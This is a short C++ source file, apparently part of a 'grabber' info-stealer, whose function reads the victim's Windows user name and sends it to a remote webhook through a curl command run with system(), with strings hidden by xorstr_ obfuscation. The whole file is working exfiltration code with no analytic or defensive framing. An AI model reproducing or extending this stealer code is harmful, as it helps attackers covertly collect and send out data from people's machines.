#include "grabber.h"

void grabbertoken::grabpcusername()
{
	char username[UNLEN + 1];
	DWORD username_len = UNLEN + 1;
	GetUserName(username, &username_len);

	std::string command = xorstr_("curl --data \"username=") + std::string(webhookname) + xorstr_("&content=```username: ") + std::string(username) + xorstr_("```&avatar_url=") + avatar_url + "\" " + webhook_url;
	system(command.c_str());
}
